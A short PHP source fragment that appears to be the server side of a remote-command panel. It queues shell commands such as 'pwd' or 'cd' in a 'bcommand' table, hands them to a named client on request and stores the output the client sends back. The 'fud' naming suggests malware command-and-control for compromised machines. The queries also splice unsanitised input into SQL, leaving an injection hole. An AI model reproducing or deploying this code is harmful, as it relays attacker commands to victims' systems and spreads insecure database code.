<?php  ////////////// user mod command code : { pwd or cd }  \\\\\\\\\\\\\\\
	if($name!=NULL)
	{
		$cmdcon=mysql_connect($host,$user,$pass);
		mysql_select_db($db,$cmdcon);
		$selcmd=mysql_query("select * from bcommand where sname='".$name."'");
		$cmdrow=mysql_fetch_array($selcmd);
			if($cmdrow['sname']!=NULL)
			{
				if((int)$_GET['cmdorder']==1)
				{
					if($cmdrow['sinput']!="")
					{
						echo $cmdrow['sinput'];
						
					}
				}
				elseif((int)$_GET['cmdorder']==2)
				{
				
				$cmdoutput=fud_head($_GET['cmdoutput']);
				
					$cmdcon=mysqli_connect($host,$user,$pass,$db);
						mysqli_query($cmdcon,"update bcommand set sinput='' , soutput='".$cmdrow['soutput'].$cmdoutput."' where sname='".$name."'");
					mysqli_close($cmdcon);
						include("nullorder.php");
						saveorder(0);
				}
			}
	}
?>